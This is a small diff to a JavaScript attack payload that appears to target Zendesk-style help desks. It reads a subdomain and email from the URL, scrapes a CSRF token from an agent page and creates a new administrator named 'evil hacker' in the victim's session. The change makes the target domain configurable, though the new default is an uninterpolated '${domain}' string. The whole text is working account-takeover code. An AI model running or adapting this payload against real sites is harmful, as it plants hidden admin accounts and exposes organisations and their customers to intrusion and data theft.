@@ -2,7 +2,7 @@ const params = new URLSearchParams( document.location.search );
 
 const newEmail = params.get( 'email' );
 const subdomain = params.get( 'subdomain' );
-const domain = params.get( 'domain' ) || 'zendesk.com'
+const domain = params.get( 'domain' ) || '${domain}'
 
 ( async function() {await addNewAdminUser( 'evil hacker', newEmail );})()
 
@@ -22,7 +22,7 @@ async function addNewAdminUser( name, email ) {
 
     const payload = JSON.stringify( data );
 
-    const url = `https://${ subdomain }.zendesk.com/agent/user_filters`;
+    const url = `https://${ subdomain }.${domain}/agent/user_filters`;
     const parsedHtml = await _getParsedHtmlFromUrl( url );
     const csrfToken = _getCsrfToken( parsedHtml );
 
